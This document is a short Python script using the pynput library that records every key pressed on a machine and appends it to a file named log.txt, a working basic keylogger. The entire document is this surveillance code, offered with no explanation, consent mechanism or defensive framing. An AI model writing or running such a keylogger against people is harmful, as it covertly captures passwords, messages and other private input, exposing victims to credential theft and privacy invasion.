from pynput.keyboard import Listener

def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    if letter == "Key.enter":
        letter = "\n"
    if letter in ['Key.shift', 'Key.shift_r', 'Key.ctrl_l', 'Key.ctrl_r', 'Key.alt_l', 'Key.alt_r', 'Key.backspace']:
        letter = ''

    with open("log.txt", 'a') as f:
        f.write(letter)

with Listener(on_press=write_to_file) as l:
    l.join()
